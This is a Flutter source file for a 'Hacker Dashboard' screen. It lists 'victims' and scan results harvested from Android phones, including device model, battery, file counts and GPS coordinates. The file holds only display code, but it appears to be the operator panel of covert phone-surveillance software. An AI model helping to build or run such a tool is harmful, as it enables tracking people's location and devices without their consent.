import 'package:flutter/material.dart';
import '../../../data/repositories/scan_repository.dart';
import '../../../data/repositories/victim_repository.dart';
import '../../../models/scan_result.dart';
import '../../../models/victim.dart';
import '../../utils/async_data.dart';
import 'victim_list_screen.dart';
import 'scan_history_screen.dart';

// Fetches both scan and vicim from firebase
class DashboardScreen extends StatefulWidget {
  const DashboardScreen({super.key});

  @override
  State<DashboardScreen> createState() => _DashboardScreenState();
}

class _DashboardScreenState extends State<DashboardScreen> {
  AsyncData<Map<String, dynamic>> data = AsyncData.notStarted();

  @override
  void initState() {
    super.initState();
    _fetchData();
  }

  void _fetchData() async {
    setState(() {
      data = AsyncData.loading();
    });

    try {
      final scans = await ScanRepository.global.fetchScans();
      final victims = await VictimRepository.global.fetchVictims();

      setState(() {
        data = AsyncData.success({'scans': scans, 'victims': victims});
      });
    } catch (e) {
      setState(() {
        data = AsyncData.error(e.toString());
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Hacker Dashboard'),
        actions: [IconButton(onPressed: _fetchData, icon: Icon(Icons.refresh))],
      ),
      body: switch (data.status) {
        AsyncStatus.notStarted => Center(child:  Text('Loading...')),
        AsyncStatus.loading => Center(child: CircularProgressIndicator()),
        AsyncStatus.error => Center(child: Text(data.error!, style: TextStyle(color: Colors.red))),
        AsyncStatus.success => _buildDashboard(data.value!),
      },
    );
  }

Widget _buildDashboard(Map<String, dynamic> value) {
    final scans = value['scans'] as List<ScanResult>;
    final victims = value['victims'] as List<Victim>;
    final latest = scans.isNotEmpty ? scans.first : null;

    return SingleChildScrollView(
      padding: EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              _statCard('Total Scans', '${scans.length}', Colors.blue),
              SizedBox(width: 12),
              _statCard('Victims', '${victims.length}', Colors.orange),
              SizedBox(width: 12),
              _statCard('With GPS', '${scans.where((s) => s.latitude != null).length}', Colors.green),
            ],
          ),
          SizedBox(height: 24),

          // latest scan
          if (latest != null) ...[
            Text('Latest Scan', style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
            SizedBox(height: 8),
            _latestScanCard(latest),
            SizedBox(height: 24),
          ],

          // quick nav
          Text('Quick Access', style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
          SizedBox(height: 8),
          ListTile(
            leading: Icon(Icons.people),
            title: Text('Victim List'),
            trailing: Icon(Icons.arrow_forward_ios),
            onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => VictimListScreen())),
          ),
          ListTile(
            leading: Icon(Icons.history),
            title: Text('Scan History'),
            trailing: Icon(Icons.arrow_forward_ios),
            onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => ScanHistoryScreen())),
          ),
        ],
      ),
    );
  }

  Widget _statCard(String label, String value, Color color) {
    return Expanded(
      child: Container(
        padding: EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: color.withValues(alpha: 0.1),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: color.withValues(alpha: 0.3)),
        ),
        child: Column(
          children: [
            Text(value, style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold, color: color)),
            Text(label, style: TextStyle(fontSize: 12, color: Colors.grey)),
          ],
        ),
      ),
    );
  }

  Widget _latestScanCard(ScanResult scan) {
    return Card(
      child: Padding(
        padding: EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(scan.deviceModel, style: TextStyle(fontWeight: FontWeight.bold)),
            Text('Android ${scan.androidVersion}', style: TextStyle(color: Colors.grey)),
            SizedBox(height: 8),
            Text('Battery: ${scan.battery}%'),
            Text('Files: ${scan.fileCount}'),
            if (scan.latitude != null) Text('GPS: ${scan.latitude!.toStringAsFixed(4)}, ${scan.longitude!.toStringAsFixed(4)}'),
            Text('Time: ${scan.timestamp.toLocal()}'),
          ],
        ),
      ),
    );
  }
}